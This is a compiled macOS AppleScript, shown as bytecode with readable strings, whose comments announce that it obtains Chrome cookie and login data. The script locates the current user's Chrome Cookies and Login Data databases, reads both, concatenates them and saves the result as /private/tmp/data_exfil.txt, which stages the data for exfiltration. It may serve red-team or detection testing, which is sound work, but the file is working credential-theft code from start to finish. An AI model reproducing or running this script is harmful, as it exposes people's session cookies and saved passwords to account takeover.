FasdUAS 1.101.10   ��   ��    k             l     ��  ��    . ( Obtain Chrome Cookie and Login Data --      � 	 	 P   O b t a i n   C h r o m e   C o o k i e   a n d   L o g i n   D a t a   - -     
  
 l     ��  ��    * $ Get the username of the active user     �   H   G e t   t h e   u s e r n a m e   o f   t h e   a c t i v e   u s e r      l     ����  r         I    �� ��
�� .sysoexecTEXT���     TEXT  m        �    w h o a m i��    o      ���� 0 
activeuser 
activeUser��  ��        l     ��������  ��  ��        l     ��  ��      Get home directory path     �   0   G e t   h o m e   d i r e c t o r y   p a t h      l     ����   r     ! " ! n     # $ # 1    ��
�� 
psxp $ l    %���� % I   �� &��
�� .earsffdralis        afdr & m    	��
�� afdrcusr��  ��  ��   " o      ����  0 homefolderpath homeFolderPath��  ��     ' ( ' l     ��������  ��  ��   (  ) * ) l     �� + ,��   +   Define file paths    , � - - $   D e f i n e   f i l e   p a t h s *  . / . l    0���� 0 r     1 2 1 b     3 4 3 o    ����  0 homefolderpath homeFolderPath 4 m     5 5 � 6 6 r L i b r a r y / A p p l i c a t i o n   S u p p o r t / G o o g l e / C h r o m e / D e f a u l t / C o o k i e s 2 o      ���� 0 cookiespath cookiesPath��  ��   /  7 8 7 l    9���� 9 r     : ; : b     < = < o    ����  0 homefolderpath homeFolderPath = m     > > � ? ? | L i b r a r y / A p p l i c a t i o n   S u p p o r t / G o o g l e / C h r o m e / P r o f i l e   1 / L o g i n   D a t a ; o      ���� 0 logindatapath loginDataPath��  ��   8  @ A @ l   # B���� B r    # C D C n    ! E F E 1    !��
�� 
psxp F m     G G � H H  / p r i v a t e / t m p / D o      ���� 0 exfildatapath exfilDataPath��  ��   A  I J I l     ��������  ��  ��   J  K L K l     �� M N��   M $  Function to read file content    N � O O <   F u n c t i o n   t o   r e a d   f i l e   c o n t e n t L  P Q P i      R S R I      �� T���� 0 readfile readFile T  U�� U o      ���� 0 filepath filePath��  ��   S Q     3 V W X V k     Y Y  Z [ Z r    
 \ ] \ l    ^���� ^ I   �� _��
�� .rdwropenshor       file _ o    ���� 0 filepath filePath��  ��  ��   ] o      ���� 0 filereference fileReference [  ` a ` r     b c b l    d���� d I   �� e��
�� .rdwrread****        **** e o    ���� 0 filereference fileReference��  ��  ��   c o      ���� 0 filecontent fileContent a  f g f I   �� h��
�� .rdwrclosnull���     **** h o    ���� 0 filereference fileReference��   g  i�� i L     j j o    ���� 0 filecontent fileContent��   W R      �� k l
�� .ascrerr ****      � **** k o      ���� 0 errmsg errMsg l �� m��
�� 
errn m o      ���� 0 errnum errNum��   X k   # 3 n n  o p o I  # 0�� q r
�� .sysodlogaskr        TEXT q b   # & s t s m   # $ u u � v v ( E r r o r   r e a d i n g   f i l e :   t o   $ %���� 0 errmsg errMsg r �� w x
�� 
btns w J   ' * y y  z�� z m   ' ( { { � | |  O K��   x �� }��
�� 
dflt } m   + , ~ ~ �    O K��   p  ��� � L   1 3 � � m   1 2 � � � � �  ��   Q  � � � l     ��������  ��  ��   �  � � � l     �� � ���   � $  Read contents of cookies file    � � � � <   R e a d   c o n t e n t s   o f   c o o k i e s   f i l e �  � � � l  $ , ����� � r   $ , � � � I   $ *�� ����� 0 readfile readFile �  ��� � o   % &���� 0 cookiespath cookiesPath��  ��   � o      ����  0 cookiescontent cookiesContent��  ��   �  � � � l     ��������  ��  ��   �  � � � l     �� � ���   � ' ! Read contents of login data file    � � � � B   R e a d   c o n t e n t s   o f   l o g i n   d a t a   f i l e �  � � � l  - 5 ����� � r   - 5 � � � I   - 3�� ����� 0 readfile readFile �  ��� � o   . /���� 0 logindatapath loginDataPath��  ��   � o      ���� $0 logindatacontent loginDataContent��  ��   �  � � � l     ��������  ��  ��   �  � � � l     �� � ���   � %  Combine contents of both files    � � � � >   C o m b i n e   c o n t e n t s   o f   b o t h   f i l e s �  � � � l  6 = ����� � r   6 = � � � b   6 9 � � � o   6 7����  0 cookiescontent cookiesContent � o   7 8���� $0 logindatacontent loginDataContent � o      ���� "0 combinedcontent combinedContent��  ��   �  � � � l     ��������  ��  ��   �  � � � l     �� � ���   � 2 , Create text file and save as data_exfil.txt    � � � � X   C r e a t e   t e x t   f i l e   a n d   s a v e   a s   d a t a _ e x f i l . t x t �  � � � l  > E ����� � r   > E � � � o   > A���� "0 combinedcontent combinedContent � o      ���� 0 textcontent textContent��  ��   �  � � � l     ��������  ��  ��   �  � � � l  F O ����� � r   F O � � � b   F K � � � o   F G���� 0 exfildatapath exfilDataPath � m   G J � � � � �  d a t a _ e x f i l . t x t � o      ���� 0 filepath filePath��  ��   �  � � � l     ��������  ��  ��   �  � � � l     �� � ���   � %  Write text content to the file    � � � � >   W r i t e   t e x t   c o n t e n t   t o   t h e   f i l e �  ��� � l  P � ����� � Q   P � � � � � k   S � � �  � � � r   S b � � � I  S ^�� � �
�� .rdwropenshor       file � o   S V�� 0 filepath filePath � �~ ��}
�~ 
perm � m   Y Z�|
�| boovtrue�}   � o      �{�{ 0 filereference fileReference �  � � � Q   c � � � � � k   f  � �  � � � I  f q�z � �
�z .rdwrseofnull���     **** � o   f i�y�y 0 filereference fileReference � �x ��w
�x 
set2 � m   l m�v�v  �w   �  ��u � I  r �t � �
�t .rdwrwritnull���     **** � o   r u�s�s 0 textcontent textContent � �r ��q
�r 
refn � o   x {�p�p 0 filereference fileReference�q  �u   � R      �o � �
�o .ascrerr ****      � **** � o      �n�n 0 errmsg errMsg � �m ��l
�m 
errn � o      �k�k 0 errnum errNum�l   � I  � ��j � �
�j .sysodlogaskr        TEXT � b   � � � � � m   � � � � � � � . E r r o r   w r i t i n g   t o   f i l e :   � o   � ��i�i 0 errmsg errMsg � �h � �
�h 
btns � J   � � � �  ��g � m   � � � � � � �  O K�g   � �f ��e
�f 
dflt � m   � � � � � � �  O K�e   �  ��d � I  � ��c ��b
�c .rdwrclosnull���     **** � o   � ��a�a 0 filereference fileReference�b  �d   � R      �` � �
�` .ascrerr ****      � **** � o      �_�_ 0 errmsg errMsg � �^ ��]
�^ 
errn � o      �\�\ 0 errnum errNum�]   � I  � ��[ � 
�[ .sysodlogaskr        TEXT � b   � � m   � � � ( E r r o r   o p e n i n g   f i l e :   o   � ��Z�Z 0 errmsg errMsg  �Y
�Y 
btns J   � � �X m   � �		 �

  O K�X   �W�V
�W 
dflt m   � � �  O K�V  ��  ��  ��       �U�U   �T�S�T 0 readfile readFile
�S .aevtoappnull  �   � **** �R S�Q�P�O�R 0 readfile readFile�Q �N�N   �M�M 0 filepath filePath�P   �L�K�J�I�H�L 0 filepath filePath�K 0 filereference fileReference�J 0 filecontent fileContent�I 0 errmsg errMsg�H 0 errnum errNum �G�F�E�D u�C {�B ~�A�@ �
�G .rdwropenshor       file
�F .rdwrread****        ****
�E .rdwrclosnull���     ****�D 0 errmsg errMsg �?�>�=
�? 
errn�> 0 errnum errNum�=  
�C 
btns
�B 
dflt�A 
�@ .sysodlogaskr        TEXT�O 4 �j  E�O�j E�O�j O�W X  �%��kv��� O� �<�;�:�9
�< .aevtoappnull  �   � **** k     �      .  7  @  �  �  �    �!!  �""  ��8�8  �;  �:   �7�6�7 0 errmsg errMsg�6 0 errnum errNum ( �5�4�3�2�1�0 5�/ >�. G�-�,�+�*�)�( ��'�&�%�$�#�"�!� �# �� �� ����	
�5 .sysoexecTEXT���     TEXT�4 0 
activeuser 
activeUser
�3 afdrcusr
�2 .earsffdralis        afdr
�1 
psxp�0  0 homefolderpath homeFolderPath�/ 0 cookiespath cookiesPath�. 0 logindatapath loginDataPath�- 0 exfildatapath exfilDataPath�, 0 readfile readFile�+  0 cookiescontent cookiesContent�* $0 logindatacontent loginDataContent�) "0 combinedcontent combinedContent�( 0 textcontent textContent�' 0 filepath filePath
�& 
perm
�% .rdwropenshor       file�$ 0 filereference fileReference
�# 
set2
�" .rdwrseofnull���     ****
�! 
refn
�  .rdwrwritnull���     ****� 0 errmsg errMsg# ���
� 
errn� 0 errnum errNum�  
� 
btns
� 
dflt� 
� .sysodlogaskr        TEXT
� .rdwrclosnull���     ****�9 ��j E�O�j �,E�O��%E�O��%E�O��,E�O*�k+ E�O*�k+ E�O��%E` O_ E` O�a %E` O Z_ a el E` O _ a jl O_ a _ l W  X  a �%a a kva  a !a " #O_ j $W  X  a %�%a a &kva  a 'a " # ascr  ��ޭ